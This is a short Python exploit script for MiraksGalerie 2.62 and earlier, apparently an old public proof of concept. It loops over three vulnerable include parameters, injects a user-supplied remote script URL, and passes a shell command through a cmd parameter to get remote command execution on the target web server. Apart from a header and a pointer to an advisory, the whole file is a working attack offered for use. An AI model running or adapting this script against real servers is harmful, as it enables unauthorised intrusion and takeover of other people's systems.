#!/usr/bin/env python
#
# MiraksGalerie <= 2.62 Multiple Remote command execution
# python f_mg-2.62.py <remote_addr> <remote_port> <remote_path> <remote_cmd>
<command>
#
# Federico Fazzi <federico@autistici.org>
# more info see advisory.

# need register_global = On

import os, sys, socket

usage = "run: python %s [remote_addr> [remote_port] [remote_path]
[remote_cmd] <command>" % os.path.basename(sys.argv[0])

if len(sys.argv) < 6:
        print usage
        sys.exit()
else:
        host = sys.argv[1]
        port = int(sys.argv[2])
        path = sys.argv[3]
        cmd = sys.argv[4]
        command = sys.argv[5]

        print "MiraksGalerie <= 2.62 Remote command execution"
        print "Federico Fazzi <federico@autistici.org>\n"

        includers = ['pcltar.lib.php?g_pcltar_lib_dr=',
        'galimage.lib.php?listconfigfile[0]=',
                     'galsecurity.lib.php?listconfigfile[0]=']

        for inc in includers:
                print ">> i try string %s" % inc
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                sock.send("GET %s%s%s?cmd=%s \r\n" % (path, inc, cmd,
                command))
        print "\n>> reading.. done\n"
        buf = sock.recv(2048)
        print buf
